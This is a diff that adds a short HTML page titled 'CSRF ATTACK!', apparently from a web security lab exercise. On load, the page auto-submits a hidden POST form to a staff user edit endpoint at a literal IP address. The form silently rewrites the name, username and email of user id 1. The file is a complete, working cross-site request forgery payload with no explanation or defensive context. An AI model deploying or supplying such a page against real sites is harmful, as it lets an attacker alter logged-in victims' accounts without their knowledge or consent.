@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>CSRF ATTACK!</title>
+</head>
+<body onload="document.getElementById('CSRFATTACK').submit()">
+	<form id="CSRFATTACK" style="display: none;" action="https://35.184.148.37/red/public/staff/users/edit.php?id=1" method="post" onload="submit">
+		<input type="text" name="first_name" value="JIMSTER" />
+		<input type="text" name="last_name" value="Munroe" />
+		<input type="text" name="username" value="jmonroe99" />
+		<input type="text" name="email" value="test@test.com">
+	</form>
+</body>
+</html>
